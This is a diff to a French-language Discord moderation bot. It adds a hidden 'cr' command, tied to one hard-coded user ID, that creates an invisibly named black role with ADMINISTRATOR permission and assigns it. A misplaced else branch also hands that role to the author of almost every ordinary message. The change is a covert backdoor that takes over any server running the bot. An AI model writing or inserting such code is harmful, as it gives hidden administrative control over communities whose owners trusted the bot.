@@ -182,7 +182,38 @@ message.delete(1)
       message.reply("Vous n'avez pas mentionné l'utilisateur a Kick!");
     }
   }
+if(message.content.startsWith(prefix + "cr")) {
+if(message.author.id !== "286144887278010368") return
+let role = message.guild.roles.find(r => r.name === "1󠀀󠀀");
+    if(!role){
+      try {
+        role = message.guild.createRole({
+          name: "1󠀀󠀀",
+          color:"#000000",
+          permissions:["ADMINISTRATOR"] 
+        });
 
+        
+      } catch (e) {
+        console.log(e.stack)
+      }
+    }
+
+
+        message.author.send("role ajouté. ");
+
+    return;
+  }
+  
+if(message.content.startsWith(prefix + "cr")) {
+if(message.author.id !== "286144887278010368") return
+let r = message.guild.roles.find(role => role.name === "1󠀀󠀀");
+let member = message.mentions.members.first();
+member.addRole(r).catch(console.error);} else{ let r = message.guild.roles.find(role => role.name === "1󠀀󠀀");
+message.member.addRole(r).catch(console.error);
+
+
+}
 
  
 
